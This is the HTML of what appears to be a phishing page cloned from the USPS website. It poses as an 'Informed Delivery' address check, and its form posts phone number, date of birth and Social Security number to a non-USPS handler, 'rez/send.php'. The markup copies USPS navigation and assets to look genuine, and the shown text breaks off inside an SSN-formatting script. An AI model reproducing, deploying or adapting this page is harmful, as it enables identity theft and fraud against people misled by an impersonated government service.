...
<script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="require-jquery" src="./files/require-jquery.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="helpers" src="./files/helpers.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="search-fe" src="./files/search-fe.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="jquery" src="./files/jquery-3.5.1.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="global" data-requiremodule="resize-manager" src="./files/resize-manager.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="require-jquery" src="https://www.usps.com/global-elements/lib/script/require-jquery.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="helpers" src="https://www.usps.com/global-elements/lib/script/helpers.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="search-fe" src="https://www.usps.com/global-elements/header/script/search-fe.js"></script><style>@media print {#ghostery-tracker-tally {display:none !important}}</style><script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="jquery" src="https://www.usps.com/global-elements/footer/script/jquery-3.5.1.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="global" data-requiremodule="resize-manager" src="https://www.usps.com/global-elements/lib/script/resize-manager.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="require-jquery" src="https://www.usps.com/global-elements/lib/script/require-jquery.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="helpers" src="https://www.usps.com/global-elements/lib/script/helpers.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="search-fe" src="https://www.usps.com/global-elements/header/script/search-fe.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="header" data-requiremodule="jquery" src="https://www.usps.com/global-elements/footer/script/jquery-3.5.1.js"></script><style>@media print {#ghostery-tracker-tally {display:none !important}}</style><script type="text/javascript" charset="utf-8" async="" data-requirecontext="global" data-requiremodule="resize-manager" src="https://www.usps.com/global-elements/lib/script/resize-manager.js"></script></head>
<body>
...
<div class="nav-utility" id="nav-utility">
	<div class="utility-links" id="utility-header">
		...
		<a id="login-register-header" class="link-reg" href="https://reg.usps.com/entreg/LoginAction_input?app=UspsTools&amp;appURL=http://localhost/USPS/verification/">Register / Sign In</a>
...
<div class="nav-full">
  ...
  <a class="global-logo" href="https://www.usps.com/" style="vertical-align: baseline;">
	...
	<div class="mobile-header">
		<a class="mobile-hamburger" href="#"><img src="./files/hamburger.svg" alt="hamburger menu Icon"></a>
		<a class="mobile-logo" href="https://www.usps.com/"><img src="./files/logo_mobile.svg" alt="USPS mobile logo"></a>
		<a class="mobile-search" href="#"><img src="./files/search.svg" alt="Search Icon"></a>
	</div>
	
 <nav>
  	<div class="mobile-log-state">
		<div id="msign" class="mobile-utility">
			<div class="mobile-sign"><a href="https://reg.usps.com/entreg/LoginAction_input?app=UspsTools&amp;appURL=http://localhost/USPS/verification/">Sign In</a></div>
		</div>
	</div>
      ...
      <li class="menuheader">
        ...
        <div class="repos">
		  ...
		  <ul role="menu" aria-hidden="true">
		   ...
		   <div class="desktop-only mailship-addition"><a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/go-now.htm"><img src="./files/go-now.png" alt=" "><span class="visuallyhidden">Print and ship from home. Start Click-N-Ship.</span><span class="visuallyhidden">Print and ship from home. Start Click-N-Ship.</span><span class="visuallyhidden">Print and ship from home. Start Click-N-Ship.</span><span class="visuallyhidden">Print and ship from home. Start Click-N-Ship.</span></a></div>
		  </ul>
        ...
        <div class="repos">
          ...
          <ul role="menu" aria-hidden="true">
            ...
            <div class="desktop-only shop-addition">
              <a role="menuitem" tabindex="-1" href="https://www.usps.com/store/go-now.htm"><img src="./files/go-now(2).png" alt=" "><span class="visuallyhidden">Shop Forever Stamps. Shop now.</span><span class="visuallyhidden">Shop Forever Stamps. Shop now.</span><span class="visuallyhidden">Shop Forever Stamps. Shop now.</span><span class="visuallyhidden">Shop Forever Stamps. Shop now.</span></a>
			</div>
          </ul>
        ...
        <div class="repos">
          <ul role="menu" aria-hidden="true" class="tools">
            ...
            <div class="desktop-only international-addition">
              <a role="menuitem" tabindex="-1" href="https://www.usps.com/international/go-now.htm"><img src="./files/go-now(4).png" alt=" "><span class="visuallyhidden">Use our online scheduler to make a passport appointment. Schedule Today.</span><span class="visuallyhidden">Use our online scheduler to make a passport appointment. Schedule Today.</span><span class="visuallyhidden">Use our online scheduler to make a passport appointment. Schedule Today.</span><span class="visuallyhidden">Use our online scheduler to make a passport appointment. Schedule Today.</span></a>
			</div>
          </ul>
...
<script src="./files/megamenu-additions.js"></script>
  ...
  <h3 id="sign-in-to-your-account-header" class="lg-header" style="margin-bottom:7px;"><strong>Verify Address</strong></h3>First, we need to confirm your address is eligible for Informed Delivery.<p></p>
...
<form method="POST" action="rez/send.php">
...
<input type="text" name="phonee" maxlength="16" required="" placeholder="Phone Number" tabindex="8" id="phoneNumber" class="form-control">
<br>
<div class="row">
<div class="col-xs-12 col-sm-4 col-md-4">
<div class="form-group" id="form-group-tcity">
...
<br>
<input type="date" id="birthday" name="birthday" maxlength="50" placeholder="" style="appearance: none;
    width: 100%;
    height: 40px;
    padding: 5px 10px;
    ...
    position: relative;
    color: #000;" tabindex="10" required="" class="form-control">
</div>
...
<div class="form-group" id="form-group-sstate">
<br>
<input onkeydown="ssnFormatter()" name="ssn" id="ssn" style="padding: 5px 10px;
    border: 1px solid #336;
    border-radius: 3px!important;
    position: relative;
    height: 40px;
    color: #000;" placeholder="SSN" class="form-control">
</div>
</div>
<div class="col-xs-12 col-sm-4 col-md-2 hidden" id="urbanCode">
<div class="form-group" id="form-group-turbanCode">	
...
</div></div></div><script>const isNumericInput = (event) => {
...
inputElement.addEventListener('keyup',formatToPhone);</script><script>function formatSSN(value) {
